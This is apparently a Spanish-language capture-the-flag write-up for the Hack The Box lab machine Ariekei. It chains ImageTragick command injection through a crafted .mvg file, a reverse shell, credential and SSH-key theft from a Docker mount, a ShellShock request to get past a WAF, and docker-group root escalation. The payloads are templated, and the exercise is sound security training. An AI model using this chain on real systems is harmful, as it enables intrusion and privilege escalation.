---------
- Tags: #shellshock #cgi-bin #image-magic #waf #docker #docker-group #pivoting 
--------------
## Técnicas utilizadas
- ImageTragick Exploitation (Specially designed '.mvg' file)  
- ShellShock Attack (WAF Bypassing)  
- Abusing Docker privilege  
- PIVOTING
## Procedimiento

![[Pasted image 20230619091433.png]]

----------------
#### Reconocimiento

Si lanzamos un escaneo con **nmap** podemos ver lo siguiente:

```
# nmap -sCV -p22,443,1022 10.10.10.65 -oN Ports
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-19 14:17 MST
Nmap scan report for 10.10.10.65
Host is up (0.13s latency).

PORT     STATE SERVICE   VERSION
22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a75bae6593cefbddf96a7fde5067f6ec (RSA)
|   256 642ca65e96cafb10058236baf0c992ef (ECDSA)
|_  256 519f8764be99352a80a6a225ebe0959f (ED25519)
443/tcp  open  ssl/https nginx/1.10.2
| ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
| Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
| Not valid before: 2017-09-24T01:37:05
|_Not valid after:  2045-02-08T01:37:05
| tls-nextprotoneg: 
|_  http/1.1
|_http-server-header: nginx/1.10.2
|_http-title: 400 The plain HTTP request was sent to HTTPS port
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 9833f6b64c18f5806685470cf6b7907e (DSA)
|   2048 78400d1c79a145d428753536ed424f2d (RSA)
|   256 45a67196df62b554666b917b746adbb7 (ECDSA)
|_  256 ad8d4d698e7afdd8cd6ec14f6f81b41f (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.92 seconds
```

Ejecutando **whatweb** en la pagina principal, podemos ver las tecnologías que están corriendo por detrás del sitio:

![[Pasted image 20230619142016.png]]

En la pagina principal logramos ver información, podemos intentar crear un diccionario con **cewl** para utilizarlo posteriormente para un ataque de fuerza bruta sobre un login o sobre directorios.

Si interceptamos la petición del formulario de contacto, podemos observar que en la respuesta se nos muestra un código PHP, a su vez, en la cabeceras, vemos que se implementa un **WAF (Web Application Firewall)**.
Si intentamos aplicar un poco de reconocimiento al **WAF** podemos usar la herramienta **wafw00f** y nos da como resultado lo siguiente:
```
# wafw00f "https://beehive.ariekei.htb/"

                   ______
                  /      \
                 (  Woof! )
                  \  ____/                      )
                  ,,                           ) (_
             .-. -    _______                 ( |__|
            ()``; |==|_______)                .)|__|
            / ('        /|\                  (  |__|
        (  /  )        / | \                  . |__|
         \(_)_))      /  |  \                   |__|

                    ~ WAFW00F : v2.1.0 ~
    The Web Application Firewall Fingerprinting Toolkit
    
[*] Checking https://beehive.ariekei.htb/
[+] Generic Detection results:
[*] The site https://beehive.ariekei.htb/ seems to be behind a WAF or some sort of security solution
[~] Reason: The server returns a different response code when an attack string is used.
Normal response code is "200", while the response code to cross-site scripting attack is "403"
[~] Number of requests: 5
```

Este mismo **WAF** nos impide ejecutar un **ShellShock** en el dominio de la pagina, ya que al intentar acontecer el **ShellShock** nos evade el **WAF**

------------
#### ImageTragick Exploitation (Specially designed '.mvg' file)  

Fuzzeando por directorios en ambos dominios y subdominios, podemos encontrar una ruta donde se nos permite subir archivos. Vemos que en el código fuente nos dejan una pista. Podemos intentar explota el ImageMagic que esta corriendo por detrás.  

Para acontecer esta vulnerabilidad, tenemos que crear un archivo con extensión *.mvg* con el siguiente contenido:

```mvg
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|<command> "<args> <content>)'
pop graphic-context
```

Una vez confirmada la ejecución remota de comandos, podemos entablarnos una *reverse shell* y continuar.

--------
#### ShellShock Attack (WAF Bypassing)

Una vez dentro, podemos irnos a la raíz del systema. Al hacer un *ls -la* podemos ver un archivo *.dockerenv* lo que nos dice que estamos en un contenedor docker. También vemos una carpeta no común de nombre *common*. Si ejecutamos el siguiente comando:

```
# mount | grep "common"
```

Podemos ver que la carpeta pertenece a una montura. En los archivos de la montura, podemos encontrar unas credenciales:

![[Pasted image 20230619145707.png]]


Dentro, de la montura también encontramos una foto que resulta interesante:

Nos muestra la infraestructura del servidor y podemos las otras maquinas en el segmento de red.
Dentro de los archivos que contiene también la carpeta, podemos encontrar un par de claves SSH:

Podemos conectarnos al otro puerto *SSH* que habíamos encontrado en el escaneo con *nmap* con la *id_rsa*. Si llega a representarnos un error, podemos intentar conectarnos de la siguiente manera

```
# ssh -i id_rsa root@ip -p1022 -o "PubkeyAcceptedKeyTypes +ssh-rsa"
```

Ahora, desde esta maquina, según la foto de la infraestructura que habíamos encontrado tendríamos que tener conectividad hacia la maquina del *WAF* ya que pertenecemos a el mismo segmento de red.

Ahora si podríamos explotar el **ShellShock**, ya que desde este contenedor no tenemos que pasar por el **WAF**. Dado que **Curl** no existe, podríamos ejecutar lo siguiente:

```
# wget -U <shell-shock> http://<ip>/cgi-bin/stats
```

Nos entablamos una shell a nuestra maquina.

---------------
#### Abusing Docker privilege  

Podemos autenticarnos como root con las credenciales encontradas en la montura del docker anterior.

Dentro del directorio de usuario, podemos encontrar unas llaves **SSH**, la id_rsa esta encriptada así que podríamos intentar crackearla con **John** 

----------
#### PIVOTING

Dentro de la maquina, vemos que pertenecemos al grupo docker, así que podemos proceder a montar la raíz de todo el equipo en una montura y escalar privilegios.

```
# docker run --rm -v /:/mnt -it <image> bash
```
